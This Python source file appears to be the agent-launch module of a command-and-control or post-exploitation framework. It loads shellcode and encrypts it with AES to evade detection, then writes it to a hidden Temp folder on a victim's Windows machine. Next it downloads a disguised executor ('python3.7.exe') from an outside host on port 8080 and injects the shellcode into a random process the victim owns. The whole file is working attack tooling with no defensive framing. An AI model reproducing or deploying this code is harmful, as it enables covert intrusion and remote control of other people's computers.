from Crypto.Cipher import AES
from dataManager.repository.userRepository import UserRepository
import logging
import binascii
import random
import asyncio
from pathlib import Path

class AgentModule:
    def __init__(self, user_repository: UserRepository):
        self.module_name = "agent"
        self.user_repository = user_repository
        self._shellcode_cache = None  # Cached shellcode
        self._shellcode_lock = asyncio.Lock()  # To prevent race conditions
        self.shellcode_loading_task = None

    async def start(self):
        """
        Starts the agent module.
        """
        self.shellcode_loading_task = asyncio.create_task(self._load_shellcode())

    async def _load_shellcode(self):
        """
        Asynchronously loads the shellcode from file and caches it.
        """
        if self._shellcode_cache is None:
            async with self._shellcode_lock:
                # Double-check to avoid redundant reads during a race condition
                if self._shellcode_cache is None:
                    logging.info("Loading shellcode from file...")
                    try:
                        shellcode_path = Path('./bin/agent.bin')
                        self._shellcode_cache = await asyncio.to_thread(shellcode_path.read_bytes)
                        logging.info("Shellcode loaded and cached.")
                    except Exception as e:
                        logging.error(f"Failed to load shellcode: {e}")
                        raise
        return self._shellcode_cache

    def _encrypt_shellcode(self, shellcode: bytes):
        """
        Encrypts the shellcode using AES encryption.
        """
        with open('./bin/aes_key.bin', 'rb') as f:
            key = f.read()
        with open('./bin/aes_iv.bin', 'rb') as f:
            iv = f.read()

        cipher = AES.new(key, AES.MODE_CBC, iv)

        length = 16 - (len(shellcode) % 16)
        shellcode += bytes([length]) * length

        encrypted = cipher.encrypt(shellcode)
        return binascii.hexlify(encrypted).decode()

    def _get_random_accessible_process(self, processes, username):
        """
        Retrieves a random accessible process for the given username.
        """
        accessible_processes = [
            proc["pid"] for proc in processes 
            if username.upper() in proc['owner'].upper()
        ]


        if accessible_processes:
            return random.choice(accessible_processes)
        return None

    async def launch_agent(self, uuid):
        """
        Launches the agent for the given user UUID.
        """
        user = self.user_repository.get_user(uuid)

        async with user.lock:
            if not self.shellcode_loading_task or not self.shellcode_loading_task.done():
                logging.error("Shellcode is not loaded yet.")
                return {"message": "Shellcode is not loaded yet."}
            logging.info("Shellcode is loaded.")

        logging.info(f"Encrypting shellcode for user {uuid}...")

        # Encrypt shellcode
        encrypted_shellcode = self._encrypt_shellcode(self._shellcode_cache)

        logging.info(f"Writting encrypted shellcode, len: {len(encrypted_shellcode)}...")

        with open('./bin/encrypted_shellcode.bin', 'w') as f:
            f.write(encrypted_shellcode)

        logging.info(f"Shellcode writen")

        # Define shellcode path
        shellcode_path = b"C:\\\\\\\\Temp\\\\\\\\05ft8_2lthb4\\\\\\\\tmp_key"

        # Write shellcode to file
        result = await user.execute("./modules/payloads/payload_write_file.py", {
            b"TO_REPLACE_WITH_FILE_PATH": shellcode_path,
            b"TO_REPLACE_WITH_FILE_CONTENT": encrypted_shellcode.encode()
        })

        logging.info(f"Shellcode written to file: {result}")

        # Download shellcode executor

        result = await user.execute("./modules/payloads/payload_download_file.py", {
            b"TO_REPLACE_WITH_URL": b"https://hackstation.virology.fr:8080/python3.7.exe",
            b"TO_REPLACE_WITH_OUTPUT_DIR": b"C:\\\\\\\\Temp\\\\\\\\05ft8_2lthb4"
        })

        logging.info(f"Shellcode executor downloaded: {result}")

        # Launch shellcode
        accessible_process = self._get_random_accessible_process(user.processes, user.username)
        if accessible_process:
            logging.info(f"Launching agent on process: {accessible_process} for user {uuid}")
            result = await user.execute("./modules/payloads/exploit/payload_exec_shellcode.py", {
                b"TO_REPLACE_WITH_METHOD": accessible_process,
            }, wait_output=False)
            logging.info("Agent launched")
            return {"message": result}
        
        logging.error("No accessible process found")

        return {"message": "No accessible process found"}
